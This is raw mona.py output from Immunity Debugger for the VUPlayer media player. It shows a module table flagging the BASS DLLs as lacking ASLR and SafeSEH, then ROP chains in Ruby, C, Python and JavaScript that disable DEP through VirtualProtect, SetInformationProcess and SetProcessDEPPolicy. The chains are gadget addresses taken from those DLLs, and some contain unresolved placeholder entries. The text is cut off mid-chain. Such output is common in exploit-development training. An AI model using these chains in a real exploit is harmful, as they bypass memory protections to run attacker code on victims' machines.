================================================================================
  Output generated by mona.py v2.0, rev 628 - Immunity Debugger
  Corelan Consulting bv - https://www.corelan.be
================================================================================
  OS : post2008server, release 6.2.9200
  Process being debugged : VUPlayer (pid 5556)
  Current mona arguments: rop -m "bass,basswma,bassmidi"
================================================================================
  2024-10-17 16:06:39
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x10000000 | 0x10041000 | 0x00041000 | False  | False   | False |  False   | False  | 2.3 [BASS.dll] (C:\Program Files (x86)\VUPlayer\BASS.dll)
 0x768a0000 | 0x768b8000 | 0x00018000 | True   | True    | True  |  False   | True   | 10.0.19041.3030 [win32u.dll] (C:\Windows\System32\win32u.dll)
 0x73e90000 | 0x73efb000 | 0x0006b000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [MMDevApi.dll] (C:\Windows\System32\MMDevApi.dll)
 0x771f0000 | 0x7726b000 | 0x0007b000 | True   | True    | True  |  False   | True   | 10.0.19041.789 [msvcp_win.dll] (C:\Windows\System32\msvcp_win.dll)
 0x774b0000 | 0x77595000 | 0x000e5000 | True   | True    | True  |  False   | True   | 10.0.19041.3030 [gdi32full.dll] (C:\Windows\System32\gdi32full.dll)
 0x754c0000 | 0x754e5000 | 0x00025000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [Wldp.dll] (C:\Windows\SYSTEM32\Wldp.dll)
 0x778c0000 | 0x7797f000 | 0x000bf000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll)
 0x77130000 | 0x771ef000 | 0x000bf000 | True   | True    | True  |  False   | True   | 7.0.19041.546 [MSVCRT.dll] (C:\Windows\System32\MSVCRT.dll)
 0x74e10000 | 0x7508e000 | 0x0027e000 | True   | True    | True  |  False   | True   | 10.0.19041.546 [CoreUIComponents.dll] (C:\Windows\System32\CoreUIComponents.dll)
 0x73d20000 | 0x73e56000 | 0x00136000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [AUDIOSES.DLL] (C:\Windows\SYSTEM32\AUDIOSES.DLL)
 0x77e10000 | 0x77fb4000 | 0x001a4000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x73aa0000 | 0x73b13000 | 0x00073000 | True   | True    | True  |  False   | True   | -1.0- [WindowManagementAPI.dll] (C:\Windows\System32\WindowManagementAPI.dll)
 0x76940000 | 0x76adc000 | 0x0019c000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [USER32.dll] (C:\Windows\System32\USER32.dll)
 0x75e40000 | 0x75eb6000 | 0x00076000 | True   | True    | True  |  False   | True   | 10.0.19041.1 [sechost.dll] (C:\Windows\System32\sechost.dll)
 0x75150000 | 0x7515f000 | 0x0000f000 | True   | True    | True  |  False   | True   | 10.0.19041.546 [kernel.appcore.dll] (C:\Windows\SYSTEM32\kernel.appcore.dll)
 0x73c10000 | 0x73d03000 | 0x000f3000 | True   | True    | True  |  False   | True   | 10.0.19041.1 [Windows.UI.dll] (C:\Windows\System32\Windows.UI.dll)
 0x74d40000 | 0x74d69000 | 0x00029000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [ntmarta.dll] (C:\Windows\SYSTEM32\ntmarta.dll)
 0x76ae0000 | 0x76b67000 | 0x00087000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [shcore.dll] (C:\Windows\System32\shcore.dll)
 0x73fe0000 | 0x740a2000 | 0x000c2000 | True   | True    | True  |  False   | True   | 7.0.19041.1708 [PROPSYS.dll] (C:\Windows\SYSTEM32\PROPSYS.dll)
 0x74250000 | 0x746a5000 | 0x00455000 | True   | True    | True  |  False   | True   | 11.00.19041.4522 [WININET.dll] (C:\Windows\SYSTEM32\WININET.dll)
 0x77c80000 | 0x77d70000 | 0x000f0000 | True   | True    | True  |  False   | True   | 10.0.19041.2788 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL)
 0x74c60000 | 0x74d3b000 | 0x000db000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [wintypes.dll] (C:\Windows\SYSTEM32\wintypes.dll)
 0x75380000 | 0x75414000 | 0x00094000 | True   | True    | True  |  False   | True   | -1.0- [TextShaping.dll] (C:\Windows\SYSTEM32\TextShaping.dll)
 0x73e60000 | 0x73e84000 | 0x00024000 | True   | True    | True  |  False   | True   | 10.0.19041.1620 [DEVOBJ.dll] (C:\Windows\System32\DEVOBJ.dll)
 0x740f0000 | 0x74214000 | 0x00124000 | True   | True    | True  |  False   | True   | 6.06.8063.0 [MFC42.DLL] (C:\Windows\SYSTEM32\MFC42.DLL)
 0x77660000 | 0x77743000 | 0x000e3000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [ole32.dll] (C:\Windows\System32\ole32.dll)
 0x754f0000 | 0x75afd000 | 0x0060d000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [windows.storage.dll] (C:\Windows\SYSTEM32\windows.storage.dll)
 0x746b0000 | 0x748c0000 | 0x00210000 | True   | True    | True  |  False   | True   | 6.10 [COMCTL32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.1110_none_a8625c1886757984\COMCTL32.dll)
 0x75d40000 | 0x75def000 | 0x000af000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [comdlg32.dll] (C:\Windows\System32\comdlg32.dll)
 0x73d10000 | 0x73d1f000 | 0x0000f000 | True   | True    | True  |  False   | True   | 10.0.19041.546 [resourcepolicyclient.dll] (C:\Windows\SYSTEM32\resourcepolicyclient.dll)
 0x768c0000 | 0x76923000 | 0x00063000 | True   | True    | True  |  False   | True   | 10.0.19041.1081 [WS2_32.dll] (C:\Windows\System32\WS2_32.dll)
 0x10100000 | 0x1010a000 | 0x0000a000 | False  | False   | False |  False   | False  | 2.3 [BASSWMA.dll] (C:\Program Files (x86)\VUPlayer\BASSWMA.dll)
 0x75090000 | 0x75149000 | 0x000b9000 | True   | True    | True  |  False   | True   | 10.0.19041.3030 [textinputframework.dll] (C:\Windows\SYSTEM32\textinputframework.dll)
 0x74220000 | 0x74248000 | 0x00028000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [WINMM.dll] (C:\Windows\SYSTEM32\WINMM.dll)
 0x75420000 | 0x75494000 | 0x00074000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [uxtheme.dll] (C:\Windows\system32\uxtheme.dll)
 0x76720000 | 0x767b6000 | 0x00096000 | True   | True    | True  |  False   | True   | 10.0.19041.985 [OLEAUT32.dll] (C:\Windows\System32\OLEAUT32.dll)
 0x754a0000 | 0x754b8000 | 0x00018000 | True   | True    | True  |  False   | True   | 10.0.19041.844 [profapi.dll] (C:\Windows\SYSTEM32\profapi.dll)
 0x73b20000 | 0x73c0d000 | 0x000ed000 | True   | True    | True  |  False   | True   | 10.0.19041.1741 [InputHost.dll] (C:\Windows\System32\InputHost.dll)
 0x76b70000 | 0x77126000 | 0x005b6000 | True   | True    | True  |  False   | True   | 10.0.19041.964 [SHELL32.dll] (C:\Windows\System32\SHELL32.dll)
 0x73f60000 | 0x73fdf000 | 0x0007f000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [dsound.dll] (C:\Windows\SYSTEM32\dsound.dll)
 0x10600000 | 0x1060f000 | 0x0000f000 | False  | False   | False |  False   | False  | 2.3 [BASSMIDI.dll] (C:\Program Files (x86)\VUPlayer\BASSMIDI.dll)
 0x75cc0000 | 0x75d3e000 | 0x0007e000 | True   | True    | True  |  False   | True   | 2001.12.10941.16384 [clbcatq.dll] (C:\Windows\System32\clbcatq.dll)
 0x76360000 | 0x76385000 | 0x00025000 | True   | True    | True  |  False   | True   | 10.0.19041.2673 [IMM32.DLL] (C:\Windows\System32\IMM32.DLL)
 0x77440000 | 0x77485000 | 0x00045000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [SHLWAPI.dll] (C:\Windows\System32\SHLWAPI.dll)
 0x767c0000 | 0x76894000 | 0x000d4000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [MSCTF.dll] (C:\Windows\System32\MSCTF.dll)
 0x00400000 | 0x00592000 | 0x00192000 | False  | False   | False |  False   | False  | 2.49 [VUPlayer.exe] (C:\Program Files (x86)\VUPlayer\VUPlayer.exe)
 0x77a40000 | 0x77c7a000 | 0x0023a000 | True   | True    | True  |  False   | True   | 10.0.19041.2788 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll)
 0x75c10000 | 0x75c18000 | 0x00008000 | True   | True    | True  |  False   | True   | 10.0.19041.546 [VERSION.dll] (C:\Windows\SYSTEM32\VERSION.dll)
 0x73f00000 | 0x73f0d000 | 0x0000d000 | True   | True    | True  |  False   | True   | -1.0- [UMPDC.dll] (C:\Windows\SYSTEM32\UMPDC.dll)
 0x77270000 | 0x77390000 | 0x00120000 | True   | True    | True  |  False   | True   | 10.0.19041.789 [ucrtbase.dll] (C:\Windows\System32\ucrtbase.dll)
 0x76390000 | 0x76610000 | 0x00280000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [combase.dll] (C:\Windows\System32\combase.dll)
 0x77620000 | 0x7765b000 | 0x0003b000 | True   | True    | True  |  False   | True   | 10.0.19041.1620 [CFGMGR32.dll] (C:\Windows\System32\CFGMGR32.dll)
 0x77390000 | 0x773b4000 | 0x00024000 | True   | True    | True  |  False   | True   | 10.0.19041.2913 [GDI32.dll] (C:\Windows\System32\GDI32.dll)
 0x74d70000 | 0x74e0b000 | 0x0009b000 | True   | True    | True  |  False   | True   | 10.0.19041.2193 [CoreMessaging.dll] (C:\Windows\System32\CoreMessaging.dll)
 0x73900000 | 0x73a94000 | 0x00194000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [twinapi.appcore.dll] (C:\Windows\SYSTEM32\twinapi.appcore.dll)
 0x740d0000 | 0x740e9000 | 0x00019000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [MSACM32.dll] (C:\Windows\SYSTEM32\MSACM32.dll)
 0x73f10000 | 0x73f54000 | 0x00044000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [powrprof.dll] (C:\Windows\SYSTEM32\powrprof.dll)
 0x773c0000 | 0x7743c000 | 0x0007c000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [ADVAPI32.dll] (C:\Windows\System32\ADVAPI32.dll)
 0x740b0000 | 0x740cd000 | 0x0001d000 | True   | True    | True  |  False   | True   | 10.0.19041.4522 [winmmbase.dll] (C:\Windows\SYSTEM32\winmmbase.dll)
 0x76300000 | 0x7635f000 | 0x0005f000 | True   | True    | True  |  False   | True   | 10.0.19041.2486 [bcryptPrimitives.dll] (C:\Windows\System32\bcryptPrimitives.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x10040284,  # ptr to &VirtualProtect() [IAT BASS.dll]
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x1001d748,  # POP EBP # RETN [BASS.dll] 
      0x1000d0ff,  # & jmp esp [BASS.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x10015414,  # POP EBX # RETN [BASS.dll] 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x106040c0,  # POP ECX # RETN [BASSMIDI.dll] 
      0x10108d3d,  # &Writable location [BASSWMA.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x100190b0,  # POP EDI # RETN [BASS.dll] 
      0x1000396b,  # RETN (ROP NOP) [BASS.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x10015f82,  // POP EAX // RETN [BASS.dll] 
      0x10040284,  // ptr to &VirtualProtect() [IAT BASS.dll]
      0x1001eaf1,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [BASS.dll] 
      0x10030950,  // XCHG EAX,ESI // RETN [BASS.dll] 
      //[---INFO:gadgets_to_set_ebp:---]
      0x1001d748,  // POP EBP // RETN [BASS.dll] 
      0x1000d0ff,  // & jmp esp [BASS.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x10015414,  // POP EBX // RETN [BASS.dll] 
      0x00000201,  // 0x00000201-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x1004041c,  // POP EDX // RETN [BASS.dll] 
      0x00000040,  // 0x00000040-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x106040c0,  // POP ECX // RETN [BASSMIDI.dll] 
      0x10108d3d,  // &Writable location [BASSWMA.dll]
      //[---INFO:gadgets_to_set_edi:---]
      0x100190b0,  // POP EDI // RETN [BASS.dll] 
      0x1000396b,  // RETN (ROP NOP) [BASS.dll]
      //[---INFO:gadgets_to_set_eax:---]
      0x10015f77,  // POP EAX // RETN [BASS.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x1001d7a5,  // PUSHAD // RETN [BASS.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x10040284,  # ptr to &VirtualProtect() [IAT BASS.dll]
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x1001d748,  # POP EBP # RETN [BASS.dll] 
      0x1000d0ff,  # & jmp esp [BASS.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x10015414,  # POP EBX # RETN [BASS.dll] 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x106040c0,  # POP ECX # RETN [BASSMIDI.dll] 
      0x10108d3d,  # &Writable location [BASSWMA.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x100190b0,  # POP EDI # RETN [BASS.dll] 
      0x1000396b,  # RETN (ROP NOP) [BASS.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u5f82%u1001" + // 0x10015f82 : ,# POP EAX # RETN [BASS.dll] 
    "%u0284%u1004" + // 0x10040284 : ,# ptr to &VirtualProtect() [IAT BASS.dll]
    "%ueaf1%u1001" + // 0x1001eaf1 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
    "%u0950%u1003" + // 0x10030950 : ,# XCHG EAX,ESI # RETN [BASS.dll] 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%ud748%u1001" + // 0x1001d748 : ,# POP EBP # RETN [BASS.dll] 
    "%ud0ff%u1000" + // 0x1000d0ff : ,# & jmp esp [BASS.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u5414%u1001" + // 0x10015414 : ,# POP EBX # RETN [BASS.dll] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u041c%u1004" + // 0x1004041c : ,# POP EDX # RETN [BASS.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u40c0%u1060" + // 0x106040c0 : ,# POP ECX # RETN [BASSMIDI.dll] 
    "%u8d3d%u1010" + // 0x10108d3d : ,# &Writable location [BASSWMA.dll]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u90b0%u1001" + // 0x100190b0 : ,# POP EDI # RETN [BASS.dll] 
    "%u396b%u1000" + // 0x1000396b : ,# RETN (ROP NOP) [BASS.dll]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u5f77%u1001" + // 0x10015f77 : ,# POP EAX # RETN [BASS.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%ud7a5%u1001" + // 0x1001d7a5 : ,# PUSHAD # RETN [BASS.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetInformationProcess() :
--------------------------------------------
 EAX = SizeOf(ExecuteFlags) (0x4)
 ECX = &ExecuteFlags (ptr to 0x00000002)
 EDX = ProcessExecuteFlags (0x22)
 EBX = NtCurrentProcess (0xffffffff)
 ESP = ReturnTo (automatic)
 EBP = ptr to NtSetInformationProcess()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
---------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  # [-] Unable to find API pointer -> eax
      0x10035184,  # MOV EBP,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00000022,  # 0x00000022-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x101049ec,  # POP ECX # RETN [BASSWMA.dll] 
      0x10000076,  # &0x00000002 [BASS.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x10003052,  # POP EBX # RETN [BASS.dll] 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x00000004,  # 0x00000004-> eax
      #[---INFO:gadgets_to_set_edi:---]
      0x10002ffd,  # POP EDI # RETN [BASS.dll] 
      0x10002ffd,  # skip 4 bytes [BASS.dll]
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  // [-] Unable to find API pointer -> eax
      0x10035184,  // MOV EBP,DWORD PTR DS:[EAX] // RETN [BASS.dll] 
      //[---INFO:gadgets_to_set_edx:---]
      0x1004041c,  // POP EDX // RETN [BASS.dll] 
      0x00000022,  // 0x00000022-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x101049ec,  // POP ECX // RETN [BASSWMA.dll] 
      0x10000076,  // &0x00000002 [BASS.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x10003052,  // POP EBX // RETN [BASS.dll] 
      0xffffffff,  // 0xffffffff-> ebx
      //[---INFO:gadgets_to_set_eax:---]
      0x10015f77,  // POP EAX // RETN [BASS.dll] 
      0x00000004,  // 0x00000004-> eax
      //[---INFO:gadgets_to_set_edi:---]
      0x10002ffd,  // POP EDI // RETN [BASS.dll] 
      0x10002ffd,  // skip 4 bytes [BASS.dll]
      //[---INFO:pushad:---]
      0x1001d7a5,  // PUSHAD // RETN [BASS.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  # [-] Unable to find API pointer -> eax
      0x10035184,  # MOV EBP,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00000022,  # 0x00000022-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x101049ec,  # POP ECX # RETN [BASSWMA.dll] 
      0x10000076,  # &0x00000002 [BASS.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x10003052,  # POP EBX # RETN [BASS.dll] 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x00000004,  # 0x00000004-> eax
      #[---INFO:gadgets_to_set_edi:---]
      0x10002ffd,  # POP EDI # RETN [BASS.dll] 
      0x10002ffd,  # skip 4 bytes [BASS.dll]
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find API pointer -> eax
    "%u5184%u1003" + // 0x10035184 : ,# MOV EBP,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u041c%u1004" + // 0x1004041c : ,# POP EDX # RETN [BASS.dll] 
    "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u49ec%u1010" + // 0x101049ec : ,# POP ECX # RETN [BASSWMA.dll] 
    "%u0076%u1000" + // 0x10000076 : ,# &0x00000002 [BASS.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u3052%u1000" + // 0x10003052 : ,# POP EBX # RETN [BASS.dll] 
    "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u5f77%u1001" + // 0x10015f77 : ,# POP EAX # RETN [BASS.dll] 
    "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u2ffd%u1000" + // 0x10002ffd : ,# POP EDI # RETN [BASS.dll] 
    "%u2ffd%u1000" + // 0x10002ffd : ,# skip 4 bytes [BASS.dll]
    "" + // #[---INFO:pushad:---] : 
    "%ud7a5%u1001" + // 0x1001d7a5 : ,# PUSHAD # RETN [BASS.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetProcessDEPPolicy() :
--------------------------------------------
 EAX = <not used>
 ECX = <not used>
 EDX = <not used>
 EBX = dwFlags (ptr to 0x00000000)
 ESP = ReturnTo (automatic)
 EBP = ptr to SetProcessDEPPolicy()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
---------------------------------------------------------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
      #[---INFO:gadgets_to_set_ebx:---]
      0x10009978,  # POP EBX # RETN [BASS.dll] 
      0x10000011,  # &0x00000000 [BASS.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x100190b0,  # POP EDI # RETN [BASS.dll] 
      0x100190b0,  # skip 4 bytes [BASS.dll]
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
      //[---INFO:gadgets_to_set_ebx:---]
      0x10009978,  // POP EBX // RETN [BASS.dll] 
      0x10000011,  // &0x00000000 [BASS.dll]
      //[---INFO:gadgets_to_set_edi:---]
      0x100190b0,  // POP EDI // RETN [BASS.dll] 
      0x100190b0,  // skip 4 bytes [BASS.dll]
      //[---INFO:pushad:---]
      0x1001d7a5,  // PUSHAD // RETN [BASS.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
      #[---INFO:gadgets_to_set_ebx:---]
      0x10009978,  # POP EBX # RETN [BASS.dll] 
      0x10000011,  # &0x00000000 [BASS.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x100190b0,  # POP EDI # RETN [BASS.dll] 
      0x100190b0,  # skip 4 bytes [BASS.dll]
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u9978%u1000" + // 0x10009978 : ,# POP EBX # RETN [BASS.dll] 
    "%u0011%u1000" + // 0x10000011 : ,# &0x00000000 [BASS.dll]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u90b0%u1001" + // 0x100190b0 : ,# POP EDI # RETN [BASS.dll] 
    "%u90b0%u1001" + // 0x100190b0 : ,# skip 4 bytes [BASS.dll]
    "" + // #[---INFO:pushad:---] : 
